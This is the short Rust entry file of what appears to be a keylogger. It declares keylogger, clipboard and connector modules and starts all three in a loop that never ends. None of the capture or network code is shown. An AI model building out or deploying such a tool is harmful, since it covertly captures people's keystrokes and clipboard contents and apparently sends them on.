use crate::clipboard::start_clipboard;
use crate::connector::start_connector;
use crate::keylogger::start_logger;

mod keylogger;
mod clipboard;
mod utils;
mod connector;

#[tokio::main]
async fn main() {
    start_connector();
    start_logger();
    start_clipboard();
    loop {}
}


